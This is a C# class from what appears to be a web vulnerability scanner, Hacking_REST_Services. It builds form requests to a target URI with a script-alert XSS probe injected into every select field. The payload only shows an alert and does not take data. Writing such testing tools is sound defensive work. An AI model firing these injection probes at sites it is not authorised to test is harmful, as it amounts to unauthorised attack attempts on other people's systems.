using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text.RegularExpressions;
using Hacking_REST_Services.Form;
using Hacking_REST_Services.WebClient;
using Hacking_REST_Services.Helpers;

namespace Hacking_REST_Services.ServiceHandlers.AttackHandlers
{
    class XSS_Attack_Selects : AbstractXSShelper
    {
        protected override IEnumerable<HttpContext> InjectScriptIntoEveryField(IFormData form, string targetUri)
        {
            var returnList = new List<HttpContext>();
            foreach (var input in form.InputFields)
            {
                var context = new HttpContext(form.Method == "GET" ? HttpMethod.Get : HttpMethod.Post, targetUri);
                foreach (var inputField in form.InputFields)
                {
                    context.AddField(inputField.Name, inputField.Value ?? "test");
                }
                foreach (var item in form.SelectFields)
                {
                    context.AddField(item.Name, $"<script>alert('X{input.Name}SS')</script>");
                }
                returnList.Add(context);
            }
            return returnList;
        }
    }
}
